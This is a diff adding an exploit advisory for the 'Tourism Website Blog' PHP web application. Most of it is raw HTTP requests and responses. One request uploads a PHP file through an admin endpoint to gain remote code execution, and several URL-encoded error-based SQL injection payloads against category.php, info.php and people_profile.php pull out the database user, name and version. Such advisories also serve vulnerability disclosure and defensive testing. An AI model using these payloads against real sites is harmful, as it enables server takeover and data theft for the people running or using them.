@@ -1,0 +1,102 @@
+# Exploit Title: Tourism Website Blog - Remote Code Execution / SQL Injection
+# Dork: N/A
+# Date: 2018-12-06
+# Exploit Author: Ihsan Sencan
+# Vendor Homepage: https://www.sourcecodester.com/php/12819/tourism-website-blog-faces-negros-web-application.html
+# Software Link: https://www.sourcecodester.com/sites/default/files/download/chrisjelo/fon_0.zip
+# Version: 1.0
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+
+# POC: 
+# 1) 
+# http://localhost/[PATH]/admin/action/add_city.php
+#
+# http://localhost/[PATH]/image/[FILE]
+#
+POST /[PATH]/admin/action/add_city.php HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Content-Type: application/octet-stream
+Content-Length: 329
+Cookie: PHPSESSID=hasj51emnq9caak0pf8h8htmm6
+DNT: 1
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+-----------------------------5585745015474: undefined
+Content-Disposition: form-data; name="image"; filename="info.php"
+<?php
+phpinfo();
+?>
+-----------------------------5585745015474
+Content-Disposition: form-data; name="submit"
+-----------------------------5585745015474--
+HTTP/1.1 302 Found
+Date: Wed, 05 Dec 2018 20:29:27 GMT
+Server: Apache/2.4.25 (Win32) OpenSSL/1.0.2j PHP/5.6.30
+X-Powered-By: PHP/5.6.30
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Location: 
+Content-Length: 1296
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+# POC: 
+# 2) 
+# http://localhost/[PATH]/category.php?category=[SQL]
+# http://localhost/[PATH]/info.php?address=[SQL]
+# http://localhost/[PATH]/negros%20blog/people_profile.php?acc_id=[SQL]
+# 
+
+#
+GET /[PATH]/category.php?category=Efe%31%32%27%7c%7c%28%53%65%6c%65%43%54%20%27Efe%27%20FroM%20duAL%20WheRE%20110=110%20AnD%20(seLEcT%20112%20frOM(SElecT%20CouNT(*),%43%6f%6e%43%41%54(CONcat(0x203a20,UseR(),DAtaBASe(),VErsION()),(%53%65%4c%45%63%74%20(ELT(112=112,1))),%46%4c%6f%6f%52(RAnd(0)*2))x%20%46%52%4f%4d%20%49%4e%46%4f%72%6d%61%74%49%4f%4e%5f%53%63%68%45%4d%41%2e%50%6c%75%47%49%4e%53%20grOUp%20BY%20%78%29%61%29%29%7c%7c%27 HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Cookie: PHPSESSID=hasj51emnq9caak0pf8h8htmm6
+DNT: 1
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+HTTP/1.1 200 OK
+Date: Wed, 05 Dec 2018 20:03:01 GMT
+Server: Apache/2.4.25 (Win32) OpenSSL/1.0.2j PHP/5.6.30
+X-Powered-By: PHP/5.6.30
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Transfer-Encoding: chunked
+Content-Type: text/html; charset=UTF-8
+
+#
+GET /[PATH]/info.php?address=1%31%32%27%7c%7c%28%53%65%6c%65%43%54%20%27Efe%27%20FroM%20duAL%20WheRE%20110=110%20AnD%20(seLEcT%20112%20frOM(SElecT%20CouNT(*),%43%6f%6e%43%41%54(CONcat(0x203a20,UseR(),DAtaBASe(),VErsION()),(%53%65%4c%45%63%74%20(ELT(112=112,1))),%46%4c%6f%6f%52(RAnd(0)*2))x%20%46%52%4f%4d%20%49%4e%46%4f%72%6d%61%74%49%4f%4e%5f%53%63%68%45%4d%41%2e%50%6c%75%47%49%4e%53%20grOUp%20BY%20%78%29%61%29%29%7c%7c%27 HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Cookie: PHPSESSID=hasj51emnq9caak0pf8h8htmm6
+DNT: 1
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+HTTP/1.1 200 OK
+Date: Wed, 05 Dec 2018 20:07:42 GMT
+Server: Apache/2.4.25 (Win32) OpenSSL/1.0.2j PHP/5.6.30
+X-Powered-By: PHP/5.6.30
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Keep-Alive: timeout=5, max=76
+Connection: Keep-Alive
+Transfer-Encoding: chunked
+Content-Type: text/html; charset=UTF-8
